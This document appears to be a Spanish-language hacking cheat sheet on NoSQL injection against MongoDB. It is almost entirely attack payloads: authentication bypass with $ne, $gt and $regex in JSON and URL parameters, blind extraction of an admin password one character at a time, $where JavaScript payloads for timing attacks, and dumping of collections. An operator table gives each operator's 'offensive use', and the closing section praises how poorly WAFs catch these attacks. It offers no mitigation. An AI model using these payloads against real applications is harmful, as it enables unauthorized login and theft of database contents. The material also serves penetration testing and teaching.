# NoSQL_MongoDB

---

MongoDB / NoSQL Injection
¿Qué es MongoDB?

MongoDB es una base de datos NoSQL documental (almacena JSON). A diferencia de SQL, las consultas usan operadores como $ne, $gt, $regex. La inyección NoSQL ocurre cuando el usuario puede manipular estos operadores, normalmente en formularios de login, búsquedas o APIs.
Detección de inyección NoSQL

    Payloads clásicos para bypassear login (enviando JSON o parámetros URL):
    json

    {"username": "admin", "password": {"$ne": ""}}
    {"username": {"$regex": "^admin"}}
    {"username": "admin", "password": {"$gt": ""}}

    En URL (si la app convierte automáticamente parámetros):
    text

    /login?username=admin&password[$ne]=
    /login?username[$regex]=^admin&password[$ne]=

Payloads para extracción de datos (sin saber estructura)

Obtener longitudes/characters (boolean‑based)
Usando $regex para preguntar si un campo empieza por un patrón:
json

{"username": {"$regex": "^a"}}   → devuelve usuarios que empiezan por 'a'

Extraer todos los documentos de una colección (si la consulta es vulnerable y no hay límite):
json

{"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]}

Inyección en consultas con $where (ejecuta JavaScript)
Si la aplicación usa $where, es posible ejecutar JS arbitrario:
json

{"$where": "this.password.length > 5"}
{"$where": "sleep(5000)"}   // ataque de tiempo

Time‑based con $where:
json

{"$where": "new Date() - new Date(2020,1,1) < 10000 ? true : sleep(5000)"}

Operadores útiles para inyección
Operador	Significado	Uso ofensivo
$ne	no igual	{"password": {"$ne": ""}} – evita comprobación
$gt, $lt	mayor/menor que	{"age": {"$gt": 18}} – para filtrar
$regex	expresión regular	{"username": {"$regex": "^admin"}} – fuerza bruta de campos
$in	valor dentro de array	{"role": {"$in": ["admin", "root"]}}
$nin	no está en array	similar
$or / $and	operadores lógicos	{"$or": [{"user": "admin"}, {"pass": "123"}]}
$where	ejecuta JS	RCE potencial si el motor de JS es vulnerable
$exists	comprueba existencia del campo	{"secret": {"$exists": true}}
Extracción a ciegas (Blind NoSQL)

Supongamos que solo puedes saber si la consulta devuelve resultados o no. Puedes usar $regex para adivinar caracter a caracter:

Payload para adivinar la contraseña del admin:
http

GET /search?username=admin&password[$regex]=^p

Si devuelve resultados, la contraseña empieza por p. Continuar con ^pa, ^pas, etc.

Versión JSON POST:
json

{"username": "admin", "password": {"$regex": "^p"}}

Extracción de nombres de colecciones (requiere acceso a system.namespaces o listCollections)
json

{"$where": "return db.getCollectionNames().indexOf('users') != -1"}
{"$where": "return tojson(db.getCollection('users').findOne())" }

(Nota: $where suele estar deshabilitado en entornos modernos.)
¿Por qué es útil en hacking?

    Muchas aplicaciones modernas usan MongoDB y los desarrolladores olvidan validar entradas JSON.

    La inyección NoSQL es menos conocida que la SQL, por lo que los WAFs y firewalls la detectan peor.

    Permite bypass de autenticación, extraer toda la base y a veces ejecución remota de código a través de $where o funciones JavaScript mal implementadas.

